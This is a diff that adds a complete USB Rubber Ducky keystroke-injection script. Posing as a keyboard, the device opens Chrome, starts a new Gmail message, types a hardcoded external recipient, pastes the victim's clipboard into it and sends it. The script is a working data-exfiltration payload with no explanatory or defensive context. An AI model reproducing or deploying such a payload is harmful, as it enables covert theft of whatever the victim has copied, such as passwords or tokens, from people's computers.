@@ -1,0 +1,24 @@
+REM The USB Rubber Ducky will function as a "keyboard"
+DELAY 1000
+GUI SPACE
+DELAY 300
+STRING Chrome
+DELAY 300
+ENTER
+DELAY 2000
+GUI t
+DELAY 1500
+STRING https://mail.google.com/mail/u/0/#inbox?compose=new
+ENTER
+DELAY 10000
+STRING psverremagnus@gmail.com
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+TAB
+DELAY 1000
+GUI v
+DELAY 1000
+TAB
+ENTER
